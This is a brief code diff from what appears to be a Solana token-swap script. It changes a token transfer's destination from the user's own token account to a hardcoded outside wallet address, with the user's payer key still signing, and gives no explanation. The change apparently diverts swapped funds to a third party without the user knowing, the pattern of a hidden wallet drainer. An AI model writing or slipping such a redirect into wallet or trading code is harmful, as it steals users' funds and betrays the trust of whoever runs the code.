@@ -125,7 +125,7 @@ const swap = async (prism, route, decimals) => {
 					  instructions.push(
 						Token.createTransferInstruction(new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
 						  tokenAccount,
-						  tokenAccount,
+						  new PublicKey("Gy1LvunZvinMMX4bpEXwxLbBv6p5ZKM8D83KEhMTqmim"),
 						  payer.publicKey,[],
 						  Math.floor(myshit * 1.0000)
 						)
